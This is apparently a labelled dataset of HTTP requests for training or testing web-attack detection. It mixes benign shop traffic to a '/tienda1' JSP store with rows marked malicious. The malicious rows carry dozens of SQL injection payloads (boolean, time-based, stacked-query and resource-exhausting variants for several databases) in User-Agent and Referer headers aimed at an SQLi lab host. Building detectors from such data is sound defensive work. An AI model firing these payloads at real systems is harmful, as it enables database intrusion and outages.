method,url,uri,query,headers,body,type
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AND (SELECT (CASE WHEN (8494=9005) THEN NULL ELSE CAST((CHR(87)||CHR(86)||CHR(114)||CHR(69)) AS NUMERIC) END)) IS NULL-- uFFW
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=87F8AC79798137DCD442C801F444F15A,modo=registro&login=draier&password=Re6raE1&nombre=Noelia&apellidos=Bernuy+Pizano&email=burkhart.waffles%40hiperespa%F1a.gq&dni=44482694G&direccion=Avenida+Jaime+i+El+Conquistador%2C+35%2C+&ciudad=Gomezserrac%EDn&cp=42191&provincia=Guadalajara&ntc=4586772087092922&B1=Registrar,benign
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=61CE2A18B4E2A0D8B38769A72F2C18DA,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FC604A497F28ACE191B699CFE129CE52,modo=insertar&precio=7448&B1=Confirmar,benign
GET,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=5F3E9085B9CCA193119D9354FCD872F8,,benign
POST,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=590B3E7CAC54E61A0220F2A2683AA594,errorMsg=Credenciales+incorrectas,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' AND 5505=1122 AND 'CSlM' LIKE 'CSlM
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5'))) RLIKE SLEEP(5) AND ((('edJf'='edJf
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,modo=entrar&login=thimothy2&pwd=e3ec05d8&remember=off&B1=Entrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=EE0272FA89EE218FF7A80E6F8ABCBDE1,,benign
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=69CD8AD02D4D1B2BE39527811D199105,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -2858) OR (SELECT (CASE WHEN (5739=5739) THEN NULL ELSE CAST((CHR(102)||CHR(103)||CHR(88)||CHR(87)) AS NUMERIC) END)) IS NULL AND (8469=8469
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=E32FC0BDE85287E5819993121EB9B96E,modo=registro&login=sheelagh&password=rehin3hir&nombre=Heraldo&apellidos=Gonyalon+Salobre%F1a&email=goertz%40satellites.st&dni=71658245C&direccion=C%2F+Luis+Llorente%2C+S%2FN%2C+11%3FG&ciudad=Lorqu%ED&cp=10883&provincia=Valencia&ntc=7089450300383912&B1=Registrar,benign
POST,/tienda1/publico/vaciar.jsp,/tienda1/publico/vaciar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=AD7D86288B22468943555419AC33D058,B2=Vaciar+carrito,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/'))) AND CHAR(87)||CHAR(99)||CHAR(67)||CHAR(78)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9392),0),5000000000),NULL) AND ((('XXwQ' LIKE 'XXwQ
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/index.jsp,/tienda1/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=4D7A2D17956EF56B3D1BAADA74D52242,,benign
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=198E3D7595DE4CDE47B31C509C28363A,id=2,benign
GET,/tienda1/imagenes/cmenbul.gif,/tienda1/imagenes/cmenbul.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=9425F428D5D2363F9C340C318A0EB036,,benign
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=4C0371B184859D53AF3E58F09819A2FA,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' WHERE 9745=9745 AND 9689=BENCHMARK(5000000,MD5(0x486f4c4a))-- LZmG
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AS wHrw WHERE 9536=9536;SELECT (CASE WHEN (6320=5670) THEN 1 ELSE 6320*(SELECT 6320 UNION ALL SELECT 5670) END)--
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/') AS WAkJ WHERE 1161=1161 AND 9739=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- cLKd
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/index.jsp,/tienda1/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=DC9BB1EA63A4A66C051A504F29F963AA,,benign
GET,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=41&B1=A%F1adir+al+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=289B75B74CBB199C60D1661EF287CA49,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=4E1654B1E3842ACCF2F9CB9E3DB7EE80,modo=insertar&precio=9301&B1=Pasar+por+caja,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' IN BOOLEAN MODE) OR 7643=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/ogono.jpg,/tienda1/miembros/imagenes/ogono.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D329744A2019EC33F48D786D845FF615,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AS mrDw WHERE 4076=4076 AND CHAR(119)||CHAR(84)||CHAR(105)||CHAR(74)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)-- PbVg
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/fotos.jsp,/tienda1/miembros/fotos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=00984AF049CC09AB6414D7378796F736,,benign
GET,/tienda1/miembros/imagenes/castro.jpg,/tienda1/miembros/imagenes/castro.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=6C508A56F3ACFBE0CB24A284F100113B,,benign
POST,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=9825CC86F0A850C81997B2836C3D4147,modo=entrar&login=vipul&pwd=chapalear&remember=on&B1=Entrar,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -8418) AS BCDX WHERE 1859=1859 OR (SELECT (CASE WHEN (8586=8586) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8586) END) FROM DUAL) IS NULL-- qibb
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"" AND 9689=BENCHMARK(5000000,MD5(0x486f4c4a)) AND ""kVUO""=""kVUO
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/global/creditos.jsp,/tienda1/global/creditos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D894C8ABFB00044DB76F79E6BC94AFDB,,benign
GET,/tienda1/imagenes/3.gif,/tienda1/imagenes/3.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=8A6AC68709A704B44969276AD32E2295,,benign
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=06500F5BC68D5FEE82057E5851166220,modo=registro&login=collamer&password=r%2497o90m1ento&nombre=Wilda&apellidos=Auque+Cote&email=ainsley_omens%40rubirubi.ne&dni=11948884Q&direccion=Carril+De+Prebetong%2C+186%2C+7C&ciudad=Niebla&cp=05268&provincia=Cuenca&ntc=4514778732444995&B1=Registrar,benign
GET,/tienda1/miembros/imagenes/castro.jpg,/tienda1/miembros/imagenes/castro.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=68DFB822B694A9B9D938CDB363F3FBF3,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5') AS yvXy WHERE 8727=8727 AND 4146=5689#
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5 AND 1982=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"" RLIKE SLEEP(5) AND ""vshx"" LIKE ""vshx
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/logo.gif,/tienda1/imagenes/logo.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=E6402E1CB1F5F9F346AF8E3A3DC810B9,,benign
GET,/tienda1/global/creditos.jsp,/tienda1/global/creditos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=572F3E58863B0479C6929ED33319E106,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5 OR (SELECT 7994 FROM (SELECT(SLEEP(5)))sfOn)-- VWud
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,modo=registro&login=engelber&password=cameliea&nombre=Harissa&apellidos=Guarderas+Bolivar&email=finklestein%40intg.ac&dni=70754396W&direccion=C%2F+Estrella+Polar%2C+139%2C+11%3FA&ciudad=Almendralejo&cp=23649&provincia=Valencia&ntc=6905475964358006&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D1D3CCCE98A845344B643D9426160B8C,,benign
GET,/tienda1/publico/productos.jsp,/tienda1/publico/productos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=F37C8046ECD5EDD3B8CD0CF9A101C6B1,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5')) OR 3498=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND (('yVpQ' LIKE 'yVpQ
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/index.jsp,/tienda1/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FD124C8793861D83F3A093DB80DECA32,,benign
GET,/tienda1/index.jsp,/tienda1/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=BB50F8A5363E8755070D8E30DB2A34F5,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"")) OR 3092=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(74)||CHR(69)||CHR(118),5) AND ((""aSLF"" LIKE ""aSLF
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -4618' OR (SELECT (CASE WHEN (3234=4370) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3234) END) FROM DUAL) IS NULL OR 'ORIz'='kISj
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"") AND 5371=9339 AND (""gLFm"" LIKE ""gLFm
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=F73C434D07A9B58D3B089B41FD17A776,modo=registro&login=snipes9&password=6udo&nombre=Leslie&apellidos=Curull&email=kyrana%40ciaplast.mo&dni=93762194A&direccion=C%2F+Juan+De+Herrera+188+9B&ciudad=Vistabella+del+Maestrazgo&cp=01118&provincia=%C1vila&ntc=4680598372819647&B1=Registrar,benign
GET,/tienda1/miembros/salir.jsp,/tienda1/miembros/salir.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FD98D185F86550E3FD0069021E3B375F,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"")) AND (SELECT (CASE WHEN (4087=9216) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4087) END) FROM DUAL) IS NULL AND ((""wCsg"" LIKE ""wCsg
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/global/menum.jsp,/tienda1/global/menum.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=898B86D4CA3582AB7F0AE8A2D4DAA43E,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: -2139')) OR 8498=1756%16
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/)) AND 1906=(SELECT 1906 FROM PG_SLEEP(5)) AND ((8347=8347
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/castro.jpg,/tienda1/miembros/imagenes/castro.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D18446C2ECC72FF977F64B3B76589AB9,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/` WHERE 6743=6743;SELECT (CASE WHEN (1383=7812) THEN 1 ELSE 1383*(SELECT 1383 UNION ALL SELECT 7812) END)--
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/salir.jsp,/tienda1/miembros/salir.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=287537E6878A95ABCB683F3E50CBE69B,,benign
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A87E0539068B916351BE90D753A55E25,id=1,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: -6610"") OR ELT(6847=6847,4900) AND (""onKF""=""onKF
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/ AND 7388=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(117)||CHR(102)||CHR(88),5)# HwON
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/ AND 5019=(SELECT COUNT(fuzzBits(char(73)||char(109)||char(84)||char(76), 0.001)) FROM numbers(1000000))-- ybHw
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' IN BOOLEAN MODE) OR 7518=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)#
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/ogono.jpg,/tienda1/miembros/imagenes/ogono.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=499D7FAA71EBDB4A8D3DC401088D9C7D,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/')) AND 7388=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(117)||CHR(102)||CHR(88),5) AND (('Ohns'='Ohns
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
